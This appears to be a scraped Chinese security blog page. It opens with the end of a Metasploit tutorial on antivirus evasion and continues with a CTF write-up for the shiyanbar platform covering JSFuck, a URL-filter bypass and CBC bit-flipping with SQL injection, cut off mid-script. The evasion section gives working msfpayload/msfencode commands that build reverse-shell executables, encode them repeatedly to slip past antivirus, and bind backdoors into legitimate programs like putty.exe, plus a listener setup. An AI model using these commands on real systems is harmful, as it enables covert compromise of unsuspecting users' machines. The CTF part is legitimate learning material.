<h4 id="七．避开杀软"><a href="#七．避开杀软" class="headerlink" title="七．避开杀软"></a>七．避开杀软</h4><h5 id="1、使用msfpayload-创建可执行后门："><a href="#1、使用msfpayload-创建可执行后门：" class="headerlink" title="1、使用msfpayload 创建可执行后门："></a>1、使用msfpayload 创建可执行后门：</h5><p>例子：<br>msfpayload windows/shell_reverse_tcp 0 #查看选项<br>msfpayload windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=31337 X &gt;<br>/var/www/payload1.exe<br>然后本机监听端口<br>msf&gt; use exploit/multi/handler<br>show options<br>set PAYLOAD windows/shell_reverse_tcp<br>set LHOST 192.168.1.111<br>set LPORT 31337<br>exploit   </p>
<h5 id="2、过杀软—使用msfencode-编码后门："><a href="#2、过杀软—使用msfencode-编码后门：" class="headerlink" title="2、过杀软—使用msfencode 编码后门："></a>2、过杀软—使用msfencode 编码后门：</h5><p>msfencode –l #列出可用编码器<br>例子：<br>msfpayload windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=31337 R<br>|msfencode –e x86/shikata_ga_nai –t exe &gt; /var/www/payload2.exe<br>使用R 参数作为raw 输出至管道，再经过msfencode 处理，最后导出。   </p>
<h5 id="3、多次编码："><a href="#3、多次编码：" class="headerlink" title="3、多次编码："></a>3、多次编码：</h5><p>例子：<br>msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.111 LPORT=31337 R |<br>msfencode –e x86/shikata_ga_nai –c 5 –t raw | msfencode –e x86/alpha_upper –c 2 –t raw |<br>msfencode –e x86/shikata_ga_nai –c 5 –t raw | msfencode –e x86/countdown –c 5 –t exe –o<br>/var/www/payload3.exe<br>简单编码被杀机会很大，使用多次编码效果更好，这里一共使用了17 次循环编码。  </p>
<h5 id="4、自定义可执行程序模板："><a href="#4、自定义可执行程序模板：" class="headerlink" title="4、自定义可执行程序模板："></a>4、自定义可执行程序模板：</h5><p>msfencode 默认使用data/templates/templates.exe（msf v4 在templates 目录下有针对不同平台的不同模板）作为可执行程序的模板，杀毒厂商也不是傻逼，所以这里最好使用自定义模板，如：<br>wget <a href="http://download.sysinternals.com/Files/ProcessExplorer.zip" target="_blank" rel="noopener">http://download.sysinternals.com/Files/ProcessExplorer.zip</a><br>cd work<br>unzip ProcessExplorer.zip<br>cd ..<br>msfpayload windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=8080 R | msfencode<br>–t exe –x work/procexp.exe –o/var/www/pe_backdoor.exe –e x86/shikata_ga_nai –c 5<br>在目标机器上运行，然后本地使用msfcli监听端口等待反弹连接：<br>msfcli exploit/multi/handler   PAYLOAD=windows/shell_reverse_tcp   LHOST=192.168.1.111<br>LPORT=8080 E  </p>
<h5 id="5、暗度陈仓—猥琐执行payload："><a href="#5、暗度陈仓—猥琐执行payload：" class="headerlink" title="5、暗度陈仓—猥琐执行payload："></a>5、暗度陈仓—猥琐执行payload：</h5><p>绑定payload 至一个可执行文件，让目标不知不觉间中招，以putty.exe 为例：<br>msfpayload windows/shell_reverse_tcp   LHOST=192.168.1.111 LPORT=8080 R | msfencode<br>–t exe –x putty.exe -o    /var/www/putty_backdoor.exe –e   x86/shikata_ga_nai –k –c 5<br>假如选择一个GUI界面的程序作为绑定目标并且不使用-k 选项，则目标执行此程序的时候不会弹出cmd窗口，-k 选项的作用是payload独立于模板软件的进程运行。   </p>

      
      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/MSF/">MSF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/技术/">技术</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-实验吧小计" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2018/06/01/实验吧小计/" class="article-date">
      <time datetime="2018-06-01T03:35:12.000Z" itemprop="datePublished">2018-06-01</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/06/01/实验吧小计/">实验吧ctf题小计</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h3 id="实验吧ctf题小计"><a href="#实验吧ctf题小计" class="headerlink" title="实验吧ctf题小计"></a>实验吧ctf题小计</h3><h4 id="天下武功唯快不破"><a href="#天下武功唯快不破" class="headerlink" title="天下武功唯快不破"></a>天下武功唯快不破</h4><p>这道题给出提示<br>There is no martial art is indefectible, while the fastest speed is the only way for long success.<br>You must do it as fast as you can!<br>审查元素发现注释<br> please post what you find with parameter:key<br> 也就是我们需要post传参一个key值得到flag<br> bp抓包看一下<br> <img src="http://wx2.sinaimg.cn/mw690/0060lm7Tly1frumcoseeqj310z09s40n.jpg" alt="image"><br> 响应头中有FLAGbase64编码，但是发现每一次请求都会改变base64值，所以我们需要写一个小脚本来快速抓取FLAG解码再post传参<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> # -*- coding: utf-8 -*</span><br><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">r= requests.get(&quot;http://ctf5.shiyanbar.com/web/10/10.php&quot;)</span><br><span class="line">r=r.headers.get(&apos;FLAG&apos;)</span><br><span class="line">r=base64.b64decode(r)</span><br><span class="line">print r[25:34]</span><br><span class="line">d = &#123;&apos;key&apos;:r[25:34]&#125;</span><br><span class="line">r = requests.post(&quot;http://ctf5.shiyanbar.com/web/10/10.php&quot;, data=d)</span><br><span class="line">print r.text</span><br></pre></td></tr></table></figure></p>
<p> 得到flag： CTF{Y0U_4R3_1NCR3D1BL3_F4ST!}</p>
<h4 id="what-a-fuck-这是什么鬼东西"><a href="#what-a-fuck-这是什么鬼东西" class="headerlink" title="what a fuck!这是什么鬼东西?"></a>what a fuck!这是什么鬼东西?</h4><p>打开得到一坨[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!。。。。<br>这是JSFuck编码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">false       =&gt;  ![]</span><br><span class="line">true        =&gt;  !![]</span><br><span class="line">undefined   =&gt;  [][[]]</span><br><span class="line">NaN         =&gt;  +[![]]</span><br><span class="line">0           =&gt;  +[]</span><br><span class="line">1           =&gt;  +!+[]</span><br><span class="line">2           =&gt;  !+[]+!+[]</span><br><span class="line">10          =&gt;  [+!+[]]+[+[]]</span><br><span class="line">Array       =&gt;  []</span><br><span class="line">Number      =&gt;  +[]</span><br><span class="line">String      =&gt;  []+[]</span><br><span class="line">Boolean     =&gt;  ![]</span><br><span class="line">Function    =&gt;  [][&quot;filter&quot;]</span><br><span class="line">eval        =&gt;  [][&quot;filter&quot;][&quot;constructor&quot;]( CODE )()</span><br><span class="line">window      =&gt;  [][&quot;filter&quot;][&quot;constructor&quot;](&quot;return this&quot;)()</span><br></pre></td></tr></table></figure></p>
<p><a href="http://www.bugku.com/tools/jsfuck/" target="_blank" rel="noopener">在线网站</a>解码得到flag：Ihatejs  </p>
<h4 id="拐弯抹角"><a href="#拐弯抹角" class="headerlink" title="拐弯抹角"></a>拐弯抹角</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">// code by SEC@USTC</span><br><span class="line"></span><br><span class="line">echo &apos;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;charset&quot; content=&quot;gbk&quot;&gt;&lt;/head&gt;&lt;body&gt;&apos;;</span><br><span class="line"></span><br><span class="line">$URL = $_SERVER[&apos;REQUEST_URI&apos;];</span><br><span class="line">//echo &apos;URL: &apos;.$URL.&apos;&lt;br/&gt;&apos;;</span><br><span class="line">$flag = &quot;CTF&#123;???&#125;&quot;;</span><br><span class="line"></span><br><span class="line">$code = str_replace($flag, &apos;CTF&#123;???&#125;&apos;, file_get_contents(&apos;./index.php&apos;));\\从index.php中读入一个字符串，再讲文件字符串中的flag变量值改变为CTF&#123;???&#125;</span><br><span class="line">$stop = 0;</span><br><span class="line"></span><br><span class="line">//这道题目本身也有教学的目的</span><br><span class="line">//第一，我们可以构造 /indirection/a/../ /indirection/./ 等等这一类的</span><br><span class="line">//所以，第一个要求就是不得出现 ./</span><br><span class="line">if($flag &amp;&amp; strpos($URL, &apos;./&apos;) !== FALSE)&#123;</span><br><span class="line">    $flag = &quot;&quot;;</span><br><span class="line">    $stop = 1;        //Pass</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//第二，我们可以构造 \ 来代替被过滤的 /</span><br><span class="line">//所以，第二个要求就是不得出现 ../</span><br><span class="line">if($flag &amp;&amp; strpos($URL, &apos;\\&apos;) !== FALSE)&#123;</span><br><span class="line">    $flag = &quot;&quot;;</span><br><span class="line">    $stop = 2;        //Pass</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//第三，有的系统大小写通用，例如 indirectioN/</span><br><span class="line">//你也可以用?和#等等的字符绕过，这需要统一解决</span><br><span class="line">//所以，第三个要求对可以用的字符做了限制，a-z / 和 .</span><br><span class="line">$matches = array();</span><br><span class="line">preg_match(&apos;/^([0-9a-z\/.]+)$/&apos;, $URL, $matches);</span><br><span class="line">if($flag &amp;&amp; empty($matches) || $matches[1] != $URL)&#123;</span><br><span class="line">    $flag = &quot;&quot;;</span><br><span class="line">    $stop = 3;        //Pass</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//第四，多个 / 也是可以的</span><br><span class="line">//所以，第四个要求是不得出现 //</span><br><span class="line">if($flag &amp;&amp; strpos($URL, &apos;//&apos;) !== FALSE)&#123;</span><br><span class="line">    $flag = &quot;&quot;;</span><br><span class="line">    $stop = 4;        //Pass</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//第五，显然加上index.php或者减去index.php都是可以的</span><br><span class="line">//所以我们下一个要求就是必须包含/index.php，并且以此结尾</span><br><span class="line">if($flag &amp;&amp; substr($URL, -10) !== &apos;/index.php&apos;)&#123;</span><br><span class="line">    $flag = &quot;&quot;;</span><br><span class="line">    $stop = 5;        //Pass</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//第六，我们知道在index.php后面加.也是可以的</span><br><span class="line">//所以我们禁止p后面出现.这个符号</span><br><span class="line">if($flag &amp;&amp; strpos($URL, &apos;p.&apos;) !== FALSE)&#123;</span><br><span class="line">    $flag = &quot;&quot;;</span><br><span class="line">    $stop = 6;        //Pass</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//第七，现在是最关键的时刻</span><br><span class="line">//你的$URL必须与/indirection/index.php有所不同</span><br><span class="line">if($flag &amp;&amp; $URL == &apos;/indirection/index.php&apos;)&#123;</span><br><span class="line">    $flag = &quot;&quot;;</span><br><span class="line">    $stop = 7;        //Pass</span><br><span class="line">&#125;</span><br><span class="line">if(!$stop) $stop = 8;</span><br><span class="line"></span><br><span class="line">echo &apos;Flag: &apos;.$flag;</span><br><span class="line">echo &apos;&lt;hr /&gt;&apos;;</span><br><span class="line">for($i = 1; $i &lt; $stop; $i++)</span><br><span class="line">    $code = str_replace(&apos;//Pass &apos;.$i, &apos;//Pass&apos;, $code);</span><br><span class="line">for(; $i &lt; 8; $i++)</span><br><span class="line">    $code = str_replace(&apos;//Pass &apos;.$i, &apos;//Not Pass&apos;, $code);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo highlight_string($code, TRUE);</span><br><span class="line"></span><br><span class="line">echo &apos;&lt;/body&gt;&lt;/html&gt;&apos;;</span><br></pre></td></tr></table></figure>
<p>代码中要求要去访问index.php，但是不能直接使用/indirection/index.php访问，同时过滤了./<br>、../、大小写绕过、//、文件后的. 、以及必须以/index.php结尾<br>在网上搜索了一下才知道可以利用伪静态技术，构造url：<a href="http://ctf5.shiyanbar.com/indirection/index.php/index.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/indirection/index.php/index.php</a><br>相当于服务器将第二个index.php当做参数处理了，服务器就只解析到第一个index.php<br>flag： CTF{PSEDUO_STATIC_DO_YOU_KNOW}   </p>
<h4 id="简单的登录题"><a href="#简单的登录题" class="headerlink" title="简单的登录题"></a>简单的登录题</h4><p>开始随便输入，然后bp抓包，发现tips：test.php<br><img src="http://wx1.sinaimg.cn/mw690/0060lm7Tly1fry0lfei0ij30yo09rq4n.jpg" alt="image"><br>访问<a href="http://ctf5.shiyanbar.com/web/jiandan/test.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/jiandan/test.php</a><br>得到源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">define(&quot;SECRET_KEY&quot;, &apos;***********&apos;);</span><br><span class="line">define(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;);\\想到cbc字节翻转攻击</span><br><span class="line">error_reporting(0);</span><br><span class="line">include(&apos;conn.php&apos;);</span><br><span class="line">function sqliCheck($str)&#123;\\该函数对传入的变量进行过滤，防止SQL注入</span><br><span class="line">	if(preg_match(&quot;/\\\|,|-|#|=|~|union|like|procedure/i&quot;,$str))&#123;</span><br><span class="line">		return 1;</span><br><span class="line">	&#125;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br><span class="line">function get_random_iv()&#123;\\该函数随机生产一个16位iv值</span><br><span class="line">    $random_iv=&apos;&apos;;</span><br><span class="line">    for($i=0;$i&lt;16;$i++)&#123;</span><br><span class="line">        $random_iv.=chr(rand(1,255));</span><br><span class="line">    &#125;</span><br><span class="line">    return $random_iv;</span><br><span class="line">&#125;</span><br><span class="line">function login($info)&#123;</span><br><span class="line">	$iv = get_random_iv();</span><br><span class="line">	$plain = serialize($info);\\对传入的数组序列化</span><br><span class="line">    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);// 采用aes-128-cbc 方式加密序列化后的plain,返回原始或者base64编码后的字符串</span><br><span class="line">    setcookie(&quot;iv&quot;, base64_encode($iv));//cookie 值为base64编码的iv</span><br><span class="line">    setcookie(&quot;cipher&quot;, base64_encode($cipher));// cookie 值为bas64编码的值cipher</span><br><span class="line">&#125;</span><br><span class="line">function show_homepage()&#123;</span><br><span class="line">	global $link;</span><br><span class="line">    if(isset($_COOKIE[&apos;cipher&apos;]) &amp;&amp; isset($_COOKIE[&apos;iv&apos;]))&#123;</span><br><span class="line">        $cipher = base64_decode($_COOKIE[&apos;cipher&apos;]);</span><br><span class="line">        $iv = base64_decode($_COOKIE[&quot;iv&quot;]);// 解码cookie和iv，并解密得到plain</span><br><span class="line">        if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123;</span><br><span class="line">            $info = unserialize($plain) or die(&quot;&lt;p&gt;base64_decode(&apos;&quot;.base64_encode($plain).&quot;&apos;) can&apos;t unserialize&lt;/p&gt;&quot;);\\这里的plain可能有两个值</span><br><span class="line">            $sql=&quot;select * from users limit &quot;.$info[&apos;id&apos;].&quot;,0&quot;;</span><br><span class="line">            $result=mysqli_query($link,$sql);</span><br><span class="line">            </span><br><span class="line">            if(mysqli_num_rows($result)&gt;0  or die(mysqli_error($link)))&#123;</span><br><span class="line">            	$rows=mysqli_fetch_array($result);</span><br><span class="line">				echo &apos;&lt;h1&gt;&lt;center&gt;Hello!&apos;.$rows[&apos;username&apos;].&apos;&lt;/center&gt;&lt;/h1&gt;&apos;;</span><br><span class="line">			&#125;</span><br><span class="line">			else&#123;</span><br><span class="line">				echo &apos;&lt;h1&gt;&lt;center&gt;Hello!&lt;/center&gt;&lt;/h1&gt;&apos;;</span><br><span class="line">			&#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            die(&quot;ERROR!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_POST[&apos;id&apos;]))&#123;</span><br><span class="line">    $id = (string)$_POST[&apos;id&apos;];</span><br><span class="line">    if(sqliCheck($id))\\过滤非法参数  </span><br><span class="line">		die(&quot;&lt;h1 style=&apos;color:red&apos;&gt;&lt;center&gt;sql inject detected!&lt;/center&gt;&lt;/h1&gt;&quot;);</span><br><span class="line">    $info = array(&apos;id&apos;=&gt;$id);</span><br><span class="line">    login($info);</span><br><span class="line">    echo &apos;&lt;h1&gt;&lt;center&gt;Hello!&lt;/center&gt;&lt;/h1&gt;&apos;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    if(isset($_COOKIE[&quot;iv&quot;])&amp;&amp;isset($_COOKIE[&apos;cipher&apos;]))&#123;</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &apos;&lt;body class=&quot;login-body&quot; style=&quot;margin:0 auto&quot;&gt;</span><br><span class="line">                &lt;div id=&quot;wrapper&quot; style=&quot;margin:0 auto;width:800px;&quot;&gt;</span><br><span class="line">                    &lt;form name=&quot;login-form&quot; class=&quot;login-form&quot; action=&quot;&quot; method=&quot;post&quot;&gt;</span><br><span class="line">                        &lt;div class=&quot;header&quot;&gt;</span><br><span class="line">                        &lt;h1&gt;Login Form&lt;/h1&gt;</span><br><span class="line">                        &lt;span&gt;input id to login&lt;/span&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                        &lt;div class=&quot;content&quot;&gt;</span><br><span class="line">                        &lt;input name=&quot;id&quot; type=&quot;text&quot; class=&quot;input id&quot; value=&quot;id&quot; onfocus=&quot;this.value=\&apos;\&apos;&quot; /&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                        &lt;div class=&quot;footer&quot;&gt;</span><br><span class="line">                        &lt;p&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Login&quot; class=&quot;button&quot; /&gt;&lt;/p&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                    &lt;/form&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">            &lt;/body&gt;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><strong>遇到的问题</strong>  </p>
<ul>
<li><p>需要进行SQL注入但是遇到了关键字过滤  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;/\\\|,|-|#|=|~|union|like|procedure/i&quot;</span><br></pre></td></tr></table></figure>
</li>
<li><p>SQL查询是id参数后面如何将后面的,0注释掉  </p>
</li>
<li>见到aes-128-cbc自然想到cbc字节翻转攻击，那么怎么来利用<br><a href="https://www.jianshu.com/p/4c1e5d24d781" target="_blank" rel="noopener">参考文章</a>   </li>
</ul>
<p><strong>解决方法</strong></p>
<ul>
<li>利用%00截断后面的,0 </li>
<li>使用cbc翻转将lnion变为union绕过过滤(CBC翻转 关键在，初始化因子 xor 原文 xor 你想的字符串 得到 更改版的初始化因子)     </li>
</ul>
<h5 id="CBC字节翻转攻击"><a href="#CBC字节翻转攻击" class="headerlink" title="CBC字节翻转攻击"></a><strong>CBC字节翻转攻击</strong></h5><p><a href="http://www.freebuf.com/articles/system/163756.html" target="_blank" rel="noopener">参考文章</a><br>加密过程：<br><img src="http://image.3001.net/images/20180228/15198072135832.png!small" alt="image"><br>Plaintext：明文数据</p>
<p>IV：初始向量</p>
<p>Key：分组加密使用的密钥</p>
<p>Ciphertext：密文数据<br>解密过程：<br>每组解密时，先进行分组加密算法的解密，然后与前一组的密文进行异或才是最初的明文。</p>
<p>对于第一组则是与IV进行异或。    </p>
<p>涉及名词：偏移量、php序列化、aes加密、异或</p>
<p><strong>攻击过程：</strong><br><strong>对于解密时</strong>：</p>
<p>设明文为X，密文为Y，解密函数为k。</p>
<p>X[i] = k(Y[i]) Xor Y[i-1]<br><strong>解密第一组时</strong>：</p>
<p>X[1]=k(Y[1]) Xor IV</p>
<p>对于X[i]的解密时，X[i] = k(Y[i]) Xor Y[i-1]，k(Y[i])部分是无法控制的，假如修改Y[i]的值，是无法确定k(Y[i])的值，由于最后是异或操作，因此可以仅修改Y[i-1]的内容为Y’[i-1]来控制最后的明文的值，设解密后的内容为M[i]=k(Y[i]) Xor Y[i-1]。</p>
<p>将Y[i-1]的值设置为Y[i-1] Xor M[i]的值，新的Y[i-1]的值用Y’[i-1]表示。</p>
<p>那么X[i] = k(Y[i]) Xor Y’[i-1]=k(Y[i]) Xor Y[i-1] Xor M[i] = M[i] Xor M[i] = 0</p>
<p>这样就能将只修改Y[i-1]的内容来控制X[i]的值</p>
<p>而此时X[i-1]的值肯定就会出错了，设修改Y[i-1]的值，导致解密后X[i-1]的值为M[i-1]，那么将Y[i-2]的值改为Y[i-2]=Y[i-2] Xor M[i-1] Xor 任意值，可以使得X[i-1]=任意值</p>
<p>这样循环往前，最后一组就是根据M[1]的值修改IV=IV Xor M[1] Xor 任意值，使得X[1]=任意值</p>
<p>对于本题来说，cookie中储存了初始的iv和cipher,我们可以利用bp修改，在本题中也是一样，先获取cipher 对应的cookie，然后字节反转为我们想要的payload，代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf8 -*-</span><br><span class="line">__author__=&apos;pcat@chamd5.org&apos;</span><br><span class="line">from base64 import *</span><br><span class="line">import urllib</span><br><span class="line">cipher=&apos;sZMYZaZsCxj98IedEp83YeaXgk4TtWPbw6D5mhkzP1I%3D&apos;</span><br><span class="line">cipher_raw=b64decode(urllib.unquote(cipher))</span><br><span class="line">lst=list(cipher_raw)</span><br><span class="line">idx=4</span><br><span class="line">c1=&apos;2&apos;</span><br><span class="line">c2=&apos;#&apos;</span><br><span class="line">lst[idx]=chr(ord(lst[idx])^ord(c1)^ord(c2))</span><br><span class="line">cipher_new=&apos;&apos;.join(lst)</span><br><span class="line">cipher_new=urllib.quote(b64encode(cipher_new))</span><br><span class="line">print(cipher_new)</span><br></pre></td></tr></table></figure></p>
<p>这里得到了新的cipher，下面利用返回的密文值和公式 C = A XOR B得到新的iv，代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf8 -*-</span><br><span class="line">__author__=&apos;pcat@chamd5.org&apos;</span><br><span class="line">from base64 import *</span><br><span class="line">import urllib</span><br><span class="line">iv=&apos;Ko5zoC%2BklAcyqq%2BqihjbwA%3D%3D&apos;</span><br><span class="line">iv_raw=b64decode(urllib.unquote(iv))</span><br><span class="line">first=&apos;a:1:&#123;s:2:&quot;id&quot;;s:&apos;</span><br><span class="line">plain=b64decode(&apos;g8COFrN/0Z3FDCOZ6MfV5zI6IjEjIjt9&apos;)</span><br><span class="line">iv_new=&apos;&apos;</span><br><span class="line">for i in range(16):</span><br><span class="line">iv_new+=chr(ord(plain[i])^ord(first[i])^ord(iv_raw[i]))</span><br><span class="line">iv_new=urllib.quote(b64encode(iv_new))</span><br><span class="line">print iv_new</span><br></pre></td></tr></table></figure></p>
<p>上述的两个脚本就可以修改iv, cipher, 将id=12 的情况变成id=1#，最后的查询脚本如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf8 -*-</span><br><span class="line"># 请保留我的个人信息，谢谢~！</span><br><span class="line">__author__=&apos;pcat@chamd5.org&apos;</span><br><span class="line">from base64 import *</span><br><span class="line">import urllib</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line"># 解码base64，获得iv,cipher的加密值</span><br><span class="line">def mydecode(value):</span><br><span class="line">return b64decode(urllib.unquote(value))</span><br><span class="line"># 转码</span><br><span class="line">def myencode(value):</span><br><span class="line">return urllib.quote(b64encode(value))</span><br><span class="line"># 